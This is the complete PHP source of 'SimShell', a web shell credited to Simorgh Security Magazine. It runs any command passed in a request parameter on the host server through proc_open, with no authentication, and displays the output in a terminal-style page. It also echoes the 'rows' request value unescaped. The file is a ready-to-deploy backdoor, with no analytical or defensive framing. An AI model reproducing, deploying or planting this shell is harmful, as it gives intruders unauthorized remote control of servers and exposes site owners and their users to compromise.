<?php

/*Simorgh Security Magazine */
  session_start();
if (empty($_SESSION['cwd']) || !empty($_REQUEST['reset'])) {
    $_SESSION['cwd'] = getcwd();
    $_SESSION['history'] = array();
    $_SESSION['output'] = '';
  }
  
  if (!empty($_REQUEST['command'])) {
    if (get_magic_quotes_gpc()) {
      $_REQUEST['command'] = stripslashes($_REQUEST['command']);
    }
    if (($i = array_search($_REQUEST['command'], $_SESSION['history'])) !== false)
      unset($_SESSION['history'][$i]);
    
    array_unshift($_SESSION['history'], $_REQUEST['command']);
  
    $_SESSION['output'] .= '$ ' . $_REQUEST['command'] . "\n";

    if (ereg('^[[:blank:]]*cd[[:blank:]]*$', $_REQUEST['command'])) {
      $_SESSION['cwd'] = dirname(__FILE__);
    } elseif (ereg('^[[:blank:]]*cd[[:blank:]]+([^;]+)$', $_REQUEST['command'], $regs)) {

      if ($regs[1][0] == '/') {

        $new_dir = $regs[1];
      } else {

        $new_dir = $_SESSION['cwd'] . '/' . $regs[1];
      }
      

      while (strpos($new_dir, '/./') !== false)
        $new_dir = str_replace('/./', '/', $new_dir);


      while (strpos($new_dir, '//') !== false)
        $new_dir = str_replace('//', '/', $new_dir);

      while (preg_match('|/\.\.(?!\.)|', $new_dir))
        $new_dir = preg_replace('|/?[^/]+/\.\.(?!\.)|', '', $new_dir);
      
      if ($new_dir == '') $new_dir = '/';
      

      if (@chdir($new_dir)) {
        $_SESSION['cwd'] = $new_dir;
      } else {
        $_SESSION['output'] .= "cd: could not change to: $new_dir\n";
      }
      
    } else {

      chdir($_SESSION['cwd']);

      $length = strcspn($_REQUEST['command'], " \t");
      $token = substr($_REQUEST['command'], 0, $length);
      if (isset($aliases[$token]))
        $_REQUEST['command'] = $aliases[$token] . substr($_REQUEST['command'], $length);
    
      $p = proc_open($_REQUEST['command'],
                     array(1 => array('pipe', 'w'),
                           2 => array('pipe', 'w')),
                     $io);


      while (!feof($io[1])) {
        $_SESSION['output'] .= htmlspecialchars(fgets($io[1]),
                                                ENT_COMPAT, 'UTF-8');
      }

      while (!feof($io[2])) {
        $_SESSION['output'] .= htmlspecialchars(fgets($io[2]),
                                                ENT_COMPAT, 'UTF-8');
      }
      
      fclose($io[1]);
      fclose($io[2]);
      proc_close($p);
    }
  }


  if (empty($_SESSION['history'])) {
    $js_command_hist = '""';
  } else {
    $escaped = array_map('addslashes', $_SESSION['history']);
    $js_command_hist = '"", "' . implode('", "', $escaped) . '"';
  }


header('Content-Type: text/html; charset=UTF-8');

echo '<?xml version="1.0" encoding="UTF-8"?>' . "\n";
?>

<head>
  <title>SimShell - Simorgh Security MGZ</title>
  <link rel="stylesheet" href="Simshell.css" type="text/css" />

  <script type="text/javascript" language="JavaScript">
  var current_line = 0;
  var command_hist = new Array(<?php echo $js_command_hist ?>);
  var last = 0;

  function key(e) {
    if (!e) var e = window.event;

    if (e.keyCode == 38 && current_line < command_hist.length-1) {
      command_hist[current_line] = document.shell.command.value;
      current_line++;
      document.shell.command.value = command_hist[current_line];
    }

    if (e.keyCode == 40 && current_line > 0) {
      command_hist[current_line] = document.shell.command.value;
      current_line--;
      document.shell.command.value = command_hist[current_line];
    }

  }

function init() {
  document.shell.setAttribute("autocomplete", "off");
  document.shell.output.scrollTop = document.shell.output.scrollHeight;
  document.shell.command.focus();
}

  </script>
</head>

<body   onload="init()" style="color: #00FF00; background-color: #000000">

<span style="background-color: #000000">



</body>

</body>
</html>



</span>



<p><span style="background-color: #000000">&nbsp;Directory: </span> <code>
<span style="background-color: #000000"><?php echo $_SESSION['cwd'] ?></span></code></p>

<form name="shell" action="<?php echo $_SERVER['PHP_SELF'] ?>" method="post">
<div style="width: 900; height: 454">
<textarea name="output" readonly="readonly" cols="120" rows="20" style="color: #CCFF33; border: 1px dashed #FF0000; background-color: #000000">
<?php
$lines = substr_count($_SESSION['output'], "\n");
$padding = str_repeat("\n", max(0, $_REQUEST['rows']+1 - $lines));
echo rtrim($padding . $_SESSION['output']);
?>
</textarea>
<p class="prompt" align="justify">
  cmd:<input class="prompt" name="command" type="text"
                onkeyup="key(event)" size="60" tabindex="1" style="border: 1px dotted #808080">
  <input type="submit" value="Enter" /><input type="submit" name="reset" value="Reset" /> Rows: 
  <input type="text" name="rows" value="<?php echo $_REQUEST['rows'] ?>" size="5" />
</p>
<p class="prompt" align="center">
  <br>
  <br>
&nbsp;<font color="#C0C0C0" size="2">Copyright 2004-Simorgh Security<br>
  Make On PhpShell Kernel<br>
  <a href="http://www.simorgh-ev.com" style="text-decoration: none">
  <font color="#C0C0C0">www.simorgh-ev.com</font></a></font></p>
</div>
</form>


</html>